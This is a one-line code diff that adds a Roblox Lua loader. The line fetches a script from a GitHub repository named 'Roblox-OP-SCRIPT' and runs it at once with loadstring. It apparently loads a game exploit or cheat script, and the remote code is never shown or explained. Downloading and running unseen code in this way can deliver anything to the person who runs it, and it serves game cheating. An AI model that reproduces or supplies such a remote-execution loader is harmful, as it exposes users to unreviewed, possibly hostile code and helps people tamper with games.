@@ -1,0 +1,1 @@
+loadstring(game:HttpGet('https://raw.githubusercontent.com/SubnauticaLaserMain/Roblox-OP-SCRIPT/main/script.lua', true))()
